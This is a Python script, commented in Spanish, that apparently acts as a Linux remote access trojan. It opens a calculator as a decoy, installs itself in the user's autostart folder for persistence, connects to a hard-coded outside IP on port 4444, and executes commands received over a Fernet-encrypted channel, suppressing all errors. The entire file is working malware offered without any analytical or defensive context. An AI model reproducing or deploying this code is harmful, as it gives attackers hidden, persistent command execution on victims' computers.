
import os
import subprocess
import socket
from cryptography.fernet import Fernet
import subprocess
subprocess.Popen(["gnome-calculator"])


# Clave Fernet en texto plano
key = b"5A8tryFj0b0GTx1nWMAiUpUKTREBusy3rIClvsab5k"
fernet = Fernet(key)

SERVER_IP = "35.193.139.222"
SERVER_PORT = 4444

def add_persistence():
    autostart_dir = os.path.expanduser("~/.config/autostart/")
    os.makedirs(autostart_dir, exist_ok=True)
    launcher_path = os.path.join(autostart_dir, "linuxclient.desktop")
    script_path = os.path.abspath(__file__)
    with open(launcher_path, "w") as f:
        f.write(f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=LinuxClient
""")

def connect():
    try:
        s = socket.socket()
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(fernet.encrypt(b"[+] Conectado desde Linux"))
        while True:
            command = fernet.decrypt(s.recv(4096)).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(fernet.encrypt(output.encode()))
        s.close()
    except Exception as e:
        pass

if __name__ == "__main__":
    add_persistence()
    subprocess.call("x-terminal-emulator -e bash", shell=True)
    connect()
